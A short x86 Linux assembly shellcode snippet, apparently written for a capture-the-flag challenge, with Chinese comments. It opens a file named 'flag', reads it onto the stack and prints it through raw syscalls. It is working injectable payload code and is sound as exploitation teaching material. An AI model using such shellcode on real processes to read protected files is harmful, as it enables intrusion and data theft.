global _start
	_start:
		; int open(const char *pathname, int flags);
		xor ecx, ecx ; #DEFINE O_RDONLY 0
		; 具体的宏定义可以这里查询 : 
		; http://lxr.free-electrons.com/source/include/asm-generic/fcntl.h?v=2.6.35#L8 
		; 也可以自己写个 C 程序打印出来看
		push ecx
		push "flag" ; nasm汇编器有一个好处就是可以直接 push 四字节的字符串 , 而不用转成 16 进制
		mov ebx, esp
		xor eax, eax
		cdq
		mov al, 05H
		int 80H
		; ssize_t read(int fd, void *buf, size_t count);
		mov dl, 0FFH ; 读 0xFF 个字节到栈上
		mov ecx, esp
		mov ebx, eax ; get fd
		mov al, 03H
		int 80H
		; ssize_t write(int fd, const void *buf, size_t count);
		mov dl, 0FFH ; 打印栈上的 0xFF 个字节
		xor ebx, ebx
		mov bl,1
		mov al, 04H
		int 80H
